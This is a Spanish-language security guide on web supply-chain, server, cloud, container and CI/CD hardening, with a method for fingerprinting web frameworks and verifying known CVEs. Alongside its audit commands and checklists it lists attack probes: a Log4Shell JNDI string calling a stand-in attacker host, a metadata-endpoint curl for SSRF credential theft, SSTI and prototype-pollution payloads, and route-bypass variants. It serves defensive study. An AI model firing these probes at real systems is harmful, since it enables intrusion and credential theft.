# Seguridad de despliegue Web y cadena de suministro

> **Fuente**: elaborado a partir de la experiencia práctica de la base de vulnerabilidades WooYun + mejores prácticas de seguridad en la nube + guía de seguridad de la cadena de suministro de OWASP
> **Metodología**: fórmula de esencia de vulnerabilidad de WooYun + análisis sistemático L1-L4
> **Relacionado**: pruebas de escape de contenedores en aplicaciones de IA → [ai-baseline-escape.md](ai-baseline-escape.md)

---

## I. Seguridad de la cadena de suministro y de componentes

### 1.1 Esencia de la vulnerabilidad

```
Riesgo de cadena de suministro = Confianza en código de terceros × Profundidad de dependencias transitivas × Retraso en actualizaciones
```

Entre el 70 y el 90% del código de una aplicación proviene de componentes de código abierto; una vulnerabilidad de alto riesgo en un solo componente puede afectar a decenas de miles de proyectos (como Log4Shell, Polyfill.io).

### 1.2 Cadena de suministro frontend

**Riesgos de dependencias npm/yarn**

| Tipo de ataque | Descripción | Caso típico |
|----------|------|----------|
| Paquete malicioso | Paquete malicioso con nombre similar (typosquatting) | `crossenv` roba variables de entorno |
| Contaminación de prototipo | Contaminación de la cadena de prototipos de `lodash`/`jQuery` | CVE-2019-10744 |
| Secuestro de dependencias | Se implanta una puerta trasera tras tomar el control de la cuenta del mantenedor | Minería de criptomonedas en `event-stream` |
| Envenenamiento de CDN | JS alojado en CDN público manipulado | Ataque a la cadena de suministro de Polyfill.io |
| Inyección en el build | Los hooks de scripts de package.json ejecutan comandos maliciosos | Ataque mediante script `postinstall` |

**Métodos de detección**

```bash
# Auditar vulnerabilidades conocidas
npm audit
yarn audit

# Verificar dependencias obsoletas
npm outdated

# Ver la profundidad del árbol de dependencias
npm ls --all | head -100

# Verificar scripts de instalación sospechosos
npm pack --dry-run  # Ver los archivos que se van a instalar
cat node_modules/<pkg>/package.json | grep -A5 '"scripts"'
```

### 1.3 Cadena de suministro backend

**Python/pip**

```bash
# Auditoría de vulnerabilidades conocidas
pip-audit
safety check

# Ver dependencias
pip list --outdated
pipdeptree  # Visualizar el árbol de dependencias
```

**Java/Maven**

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# Ver el árbol de dependencias
mvn dependency:tree
```

**Referencia rápida de vulnerabilidades comunes de componentes de alto riesgo**

| Componente | CVE | Impacto | Detección |
|------|-----|------|------|
| Log4j2 | CVE-2021-44228 | RCE | `${jndi:ldap://attacker/}` |
| Spring4Shell | CVE-2022-22965 | RCE | Spring Framework < 5.3.18 |
| FastJSON | CVE-2022-25845 | RCE | Deserialización autoType |
| Apache Struts2 | CVE-2017-5638 | RCE | Inyección en Content-Type |
| Jackson | CVE-2019-12384 | RCE | Deserialización polimórfica |
| Commons-Collections | CVE-2015-6420 | RCE | Cadena de deserialización Java |
| jQuery | CVE-2020-11022 | XSS | Inyección HTML < 3.5.0 |
| Lodash | CVE-2021-23337 | RCE | Inyección de plantillas |

### 1.4 Cadena de suministro de imágenes Docker

```bash
# Escaneo de vulnerabilidades de imágenes
trivy image <image:tag>
grype <image:tag>

# Verificar imagen base
docker inspect <image> | grep -i "rootfs\|created\|author"

# Ver historial de capas de la imagen (descubrir archivos ocultos/claves)
docker history --no-trunc <image>
```

**Puntos de riesgo**:
- Usar la etiqueta `latest` en vez de una versión fija
- Imagen base demasiado grande (contiene herramientas innecesarias como gcc/curl)
- Claves/credenciales codificadas directamente en el Dockerfile
- Ejecutar el contenedor con usuario root

### 1.5 Herramientas SCA recomendadas

| Herramienta | Lenguaje/escenario | Características |
|------|-----------|------|
| `npm audit` / `yarn audit` | JavaScript | Integrado, gratuito |
| `pip-audit` / `safety` | Python | Gratuito |
| OWASP Dependency-Check | Java/.NET | Código abierto, soporta múltiples lenguajes |
| Snyk | Todos los lenguajes | SaaS, base de vulnerabilidades más completa |
| Trivy | Contenedor/IaC/SBOM | Código abierto, rápido |
| Grype | Imágenes de contenedor | Código abierto, de Anchore |
| Renovate / Dependabot | Actualización automática | Integración con GitHub |

### 1.6 SBOM (lista de materiales de software)

```bash
# Generar SBOM (formato CycloneDX)
cyclonedx-npm --output sbom.json            # Node.js
cyclonedx-py --format json -o sbom.json      # Python
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom  # Java

# Generar SBOM (formato SPDX)
syft <image> -o spdx-json > sbom.spdx.json   # Imagen de contenedor
```

Usos del SBOM: auditoría de cumplimiento, cumplimiento de licencias, seguimiento de vulnerabilidades, transparencia de la cadena de suministro.

### 1.7 Medidas de defensa

- **Fijar versiones**: usar `package-lock.json` / `Pipfile.lock` / `pom.xml` para fijar versiones
- **Dependencias mínimas**: limpiar periódicamente las dependencias no usadas, evitar la expansión de dependencias transitivas
- **Integración en CI**: incorporar escaneo SCA en CI/CD, bloquear el build ante vulnerabilidades
- **Repositorio privado**: usar proxy Nexus/Verdaccio, evitar extraer directamente de repositorios públicos
- **Verificación de firma**: npm soporta `npm audit signatures` para verificar la firma de los paquetes
- **Actualización periódica**: configurar Dependabot/Renovate para crear PR de actualización automáticamente

---

## II. Seguridad de despliegue en la nube y de servidores

### 2.1 Esencia del riesgo

```
Riesgo de despliegue = Confianza en configuración por defecto × Superficie de exposición × Negligencia operativa
```

La seguridad del código de la aplicación no equivale a la seguridad del sistema. Los errores de configuración del entorno de despliegue suelen ser el punto de entrada que los atacantes explotan primero.

### 2.2 Verificación de fortalecimiento del servidor

**Puertos y servicios**

```bash
# Escanear puertos abiertos
nmap -sV -p- <target>

# Referencia rápida de puertos de alto riesgo
# 22(SSH) 3306(MySQL) 6379(Redis) 27017(MongoDB) 9200(Elasticsearch)
# 8080(Tomcat) 8443(administración) 2375(Docker API) 10250(Kubelet)
```

| Elemento a verificar | Configuración segura | Riesgo |
|--------|----------|------|
| SSH | Deshabilitar login root, autenticación por clave, puerto distinto de 22 | Fuerza bruta |
| Puerto de base de datos | Vincular solo a 127.0.0.1/IP de red interna | Acceso no autorizado |
| Redis | Establecer contraseña, deshabilitar acceso externo, renombrar comandos peligrosos | RCE (escribir webshell/crontab/ssh) |
| MongoDB | Habilitar autenticación, vincular a red interna | Fuga de datos |
| Docker API | Vincular a Unix Socket, habilitar TLS | Escape de contenedor/RCE |
| Elasticsearch | Autenticación X-Pack, deshabilitar acceso externo | Fuga de datos |
| API de Kubernetes | RBAC, políticas de red, logs de auditoría | Toma de control del clúster |

**Fortalecimiento del sistema operativo**

```bash
# Verificación de fortalecimiento en Linux
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuth|Port"
cat /etc/passwd | grep ':0:'          # Usuarios root ilegítimos
find / -perm -4000 2>/dev/null        # Archivos SUID
crontab -l                            # Puertas traseras en tareas programadas
last -20                              # Registros de inicio de sesión recientes
ss -tlnp                              # Puertos en escucha
iptables -L -n                        # Reglas del firewall
```

### 2.3 Configuración de TLS/SSL/HTTPS

**Métodos de prueba**

```bash
# Verificación de configuración SSL/TLS
nmap --script ssl-enum-ciphers -p 443 <target>
testssl.sh <target>
sslyze <target>

# Verificación en línea
# https://www.ssllabs.com/ssltest/
```

**Problemas comunes**

| Problema | Riesgo | Corrección |
|------|------|------|
| TLS 1.0/1.1 no deshabilitado | Ataques BEAST/POODLE | Habilitar solo TLS 1.2+ |
| Conjuntos de cifrado débiles (RC4/DES/MD5) | Ataque de downgrade | Usar AES-GCM/ChaCha20 |
| Certificado caducado/autofirmado | Ataque man-in-the-middle | Usar certificado de Let's Encrypt/CA |
| Falta la cabecera HSTS | SSL Strip | `Strict-Transport-Security: max-age=31536000` |
| Contenido mixto (HTTP+HTTPS) | Secuestro de contenido | HTTPS en todo el sitio + CSP |

**Referencia de configuración segura de Nginx**

```nginx
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # Cabeceras de seguridad
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Content-Security-Policy "default-src 'self'";
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # Ocultar versión
    server_tokens off;
    
    # Prohibir listado de directorios
    autoindex off;
}
```

### 2.4 Seguridad de servicios en la nube

**Riesgos genéricos en la nube (AWS/Azure/GCP/Alibaba Cloud)**

| Riesgo | Método de detección | Impacto |
|------|----------|------|
| Bucket S3/OSS público | `aws s3 ls s3://bucket --no-sign-request` | Fuga de datos |
| Permisos IAM demasiado amplios | Verificar políticas con comodín `*` | Escalada de privilegios |
| Grupo de seguridad totalmente abierto | Verificar reglas de entrada `0.0.0.0/0` | Exposición de servicios internos |
| Clave codificada directamente | Escanear el repositorio de código con `trufflehog`/`gitleaks` | Toma de control de cuenta |
| Servicio de metadatos | `curl http://169.254.169.254/` (explotación de SSRF) | Robo de credenciales |
| Logs no habilitados | Auditoría CloudTrail/ActionTrail | Imposibilidad de rastreo |

**Riesgos de plataformas PaaS (Railway/Vercel/Heroku/Netlify)**

| Riesgo | Descripción | Detección |
|------|------|------|
| Fuga de variables de entorno | Logs de build/páginas de error exponen ENV | Revisar logs de build públicos |
| Toma de control de dominio | CNAME apunta a una aplicación PaaS eliminada | `dig CNAME <domain>` para verificar registros colgantes |
| Escape del runtime compartido | Aislamiento insuficiente entre contenedores multi-tenant | Sondear servicios en el mismo nodo |
| Fuga de credenciales de despliegue | Token de API en texto plano en la configuración de CI | Revisar los archivos de configuración de CI/CD |
| Inyección en función | Inyección de eventos en funciones Serverless | Probar la controlabilidad de los parámetros del evento |

**Detección de fuga de claves en la nube**

```bash
# Escaneo del repositorio de código
gitleaks detect --source=. --verbose
trufflehog git https://github.com/org/repo

# Ubicaciones comunes de fuga
.env / .env.production / .env.local
docker-compose.yml
Configuración CI: .github/workflows/*.yml / .gitlab-ci.yml / Jenkinsfile
Código frontend: next.config.js / .env.NEXT_PUBLIC_*
```

### 2.5 Seguridad de contenedores y orquestación

> **Escape de contenedores en aplicaciones de IA**: metodología de pruebas de escape de contenedores para entornos de despliegue de AI Agent/LLM → [ai-baseline-escape.md](ai-baseline-escape.md)

**Verificación de seguridad de Docker**

```bash
# El contenedor se ejecuta como no root
docker inspect <container> | grep '"User"'

# Verificar modo privilegiado
docker inspect <container> | grep '"Privileged"'

# Verificar montajes (directorios sensibles)
docker inspect <container> | grep -A10 '"Mounts"'

# Verificar Capabilities
docker inspect <container> | grep -A20 '"CapAdd"'
```

**Verificación de seguridad de Kubernetes**

```bash
# Auditoría RBAC
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebinding -o wide

# Seguridad de Pod
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# Verificación de Secret en texto plano
kubectl get secrets -o yaml | grep -i "password\|token\|key"

# Políticas de red
kubectl get networkpolicy -A
```

### 2.6 Seguridad del pipeline CI/CD

| Riesgo | Descripción | Defensa |
|------|------|------|
| Claves almacenadas en texto plano | Clave codificada directamente en la configuración del pipeline | Usar Vault/Sealed Secrets |
| Dependencia no confiable | Extraer herramientas de build no verificadas en CI | Fijar la versión de la imagen de CI |
| Inyección en el build | Modificar la configuración de CI en un PR para ejecutar código malicioso | Los PR de fork necesitan aprobación antes de disparar CI |
| Manipulación de artefactos | Los productos del build no están firmados | Firma con Cosign/Notary |
| Permisos demasiado amplios | El Token de CI tiene permisos de administrador | Token con privilegios mínimos |

### 2.7 Checklist de seguridad de despliegue

**Servidor**
- [ ] Inicio de sesión SSH mediante clave, deshabilitar contraseña y root
- [ ] El firewall solo abre los puertos necesarios (80/443)
- [ ] La base de datos/caché solo escucha en red interna
- [ ] Actualización periódica de parches del SO y del middleware
- [ ] Habilitar logs de auditoría y detección de intrusiones

**HTTPS**
- [ ] TLS 1.2+ y deshabilitar conjuntos de cifrado débiles
- [ ] Cabecera HSTS + registro CAA
- [ ] Renovación automática de certificado (Let's Encrypt)

**Servicios en la nube**
- [ ] IAM con privilegios mínimos + MFA
- [ ] Bucket de almacenamiento privado + cifrado
- [ ] Grupo de seguridad restringe la IP de origen
- [ ] CloudTrail/logs de auditoría habilitados
- [ ] Claves gestionadas mediante KMS/Vault, sin codificar directamente

**Contenedores**
- [ ] Ejecución con usuario no root
- [ ] Sistema de archivos de solo lectura
- [ ] Sin modo privilegiado + Capabilities mínimas
- [ ] Escaneo de imágenes (Trivy/Grype)
- [ ] Política de red que aísla la comunicación entre Pods

**CI/CD**
- [ ] Claves gestionadas mediante Secret, no en los archivos de configuración
- [ ] Escaneo SCA integrado en el pipeline de build
- [ ] Verificación de firma de artefactos
- [ ] Los PR de fork disparan el build solo tras aprobación

---

## III. Metodología general de detección de CVE en frameworks Web

> Aplicable a la detección de CVE conocidos y verificación de explotación en cualquier framework Web como Next.js, Spring Boot, Django, Rails, Express, Laravel, etc.

### 3.1 Identificación de huella (fingerprinting) del framework

**Recolección automatizada de huella**

| Fuente de huella | Método de detección | Información extraída |
|----------|----------|----------|
| Cabeceras de respuesta HTTP | Verificar `X-Powered-By`, `Server`, `X-Framework` | Nombre y versión del framework |
| Nombre de la Cookie | `JSESSIONID`(Java), `laravel_session`(Laravel), `_next`(Next.js) | Tipo de framework |
| Página de error por defecto | Provocar 404/500, analizar características, estilo y texto de la página | Framework + modo de depuración |
| Ruta de recursos estáticos | `/_next/`(Next.js), `/static/`(Django), `/assets/`(Rails) | Framework + herramienta de build |
| Contenido de archivos JS | Buscar identificadores `webpack`/`vite`/`turbopack`, cadenas de versión del framework | Número de versión exacto |
| Source Map | Acceder a `*.js.map` para verificar fuga, analizar rutas de import | Framework + lista completa de librerías dependientes |
| Meta tags/comentarios | `<meta name="generator">` en el HTML, comentarios de build | Versión del framework |
| Fuga de package.json | Acceder a `/package.json`, `/composer.json`, `/Gemfile.lock` | Todas las dependencias y su versión exacta |

```
Flujo de identificación de huella:
1. Recolección pasiva → análisis de cabeceras de respuesta, Cookie, HTML, JS
2. Sondeo activo → rutas por defecto, provocación de errores, acceso a archivos de configuración
3. Fijación de versión → precisa hasta versión mayor.versión menor.parche
4. Coincidencia de CVE → consulta en NVD/Snyk/GitHub Advisory
```

### 3.2 Búsqueda de CVE y verificación de PoC

**Fuentes de datos de CVE**

| Fuente de datos | URL | Características |
|--------|-----|------|
| NVD | nvd.nist.gov | Base de CVE oficial, puntuación CVSS |
| GitHub Advisory | github.com/advisories | Vulnerabilidades de proyectos de código abierto, con enlaces a PoC |
| Snyk | snyk.io/vuln | Coincidencia precisa a nivel de dependencia |
| Exploit-DB | exploit-db.com | PoC y EXP verificados |
| PacketStorm | packetstormsecurity.com | Avisos de seguridad y código de explotación |
| ChangeLog del framework | Notas de versión oficiales del framework | Detalles de correcciones de seguridad |

**Flujo general de verificación de CVE**

```
1. Comparación de versión
   Confirmar el número de versión → consultar el rango de versiones afectadas del CVE (affected versions) → confirmar si está dentro del rango afectado

2. Reproducción de PoC
   a. Buscar PoC públicos (GitHub/Exploit-DB/blogs de seguridad)
   b. Entender el principio de la vulnerabilidad (el diff del parche es el mejor material)
   c. Construir la petición en el entorno de pruebas para verificar
   d. Nota: en producción solo verificar la condición de disparo, no ejecutar Payloads destructivos

3. Análisis del parche (contramedidas de defensa L4)
   a. Comparar el diff de código antes y después de la corrección → entender qué se corrigió
   b. Deducción inversa: dónde estaba el defecto en la lógica de procesamiento antes de la corrección
   c. Reflexión: ¿la corrección es completa? ¿existe posibilidad de bypass de la corrección?
```

### 3.3 Clasificación de superficies de ataque comunes en frameworks

| Tipo de superficie de ataque | Método de detección general | Patrón de vulnerabilidad típico |
|-----------|-------------|-------------|
| **Bypass de rutas/middleware** | Prueba de normalización de rutas: `//path`, `/./path`, `/%2e/path`, variantes de mayúsculas/minúsculas, falsificación de cabeceras especiales | Bypass de autenticación, omisión de autorización |
| **Inyección de plantillas/renderizado** | Inyectar sintaxis de plantilla en los parámetros: `{{7*7}}`(Jinja2), `${7*7}`(Thymeleaf), `<%= 7*7 %>`(ERB) | SSTI→RCE |
| **Deserialización** | Identificar el formato de serialización (`ac ed 00 05`/`O:`/`rO0AB`), enviar datos serializados maliciosos | RCE por deserialización en Java/PHP/Python |
| **Server Actions/RPC** | Interceptar llamadas RPC propias del framework, analizar el identificador del endpoint, invocar directamente saltándose la validación del frontend | CSRF, bypass de validación de entrada |
| **Inyección SSR/RSC** | Interceptar y modificar los parámetros de renderizado del lado del servidor (como `_rsc`/`__data`/`loader`), construir un Payload anómalo | Ejecución de código en el servidor |
| **Fuga de archivos de configuración** | Recorrer rutas de configuración comunes: `.env`, `web.config`, `application.yml`, `settings.py` | Fuga de claves/credenciales |
| **Endpoint de depuración** | Verificar el modo de depuración del framework: `/debug`, `/_debug`, `/__inspect`, `/graphql`(introspection) | Fuga de información→RCE |
| **Contaminación de prototipo (JS)** | Inyectar en el cuerpo de la petición JSON `{"__proto__":{"isAdmin":true}}` o `{"constructor":{"prototype":{"x":1}}}` | Escalada de privilegios, DoS |
| **Envenenamiento de caché** | Manipular cabeceras relacionadas con la clave de caché (`X-Forwarded-Host`/`X-Original-URL`), verificar si la respuesta se almacena en caché | XSS almacenado, phishing |

### 3.4 Checklist general de seguridad de frameworks

```
[ ] Confirmar la versión exacta del framework y de todas sus dependencias
[ ] Consultar en NVD/Snyk/GitHub Advisory los CVE correspondientes
[ ] Verificar si todos los CVE de alto riesgo (CVSS≥7.0) están corregidos
[ ] Verificar si el Source Map está deshabilitado
[ ] Verificar si el modo de depuración está desactivado
[ ] Verificar si la página de error filtra pila de llamadas/rutas/versión
[ ] Verificar si las rutas de archivos de configuración por defecto son accesibles
[ ] Verificar si la autorización de middleware/rutas puede sortearse mediante variantes de ruta
[ ] Verificar si todos los endpoints de la API requieren autenticación (probar eliminando Cookie/Token)
[ ] Verificar que las cabeceras de respuesta de seguridad estén completas (CSP/HSTS/X-Frame-Options/X-Content-Type-Options)
[ ] Verificar que la protección CSRF cubra todas las operaciones que cambian estado
[ ] Verificar si los endpoints RPC/Action propios del framework tienen autorización independiente
```

---

*Elaborado a partir de la base de vulnerabilidades WooYun (88,636 registros) + mejores prácticas de seguridad en la nube/cadena de suministro | Solo para investigación de seguridad y referencia defensiva*
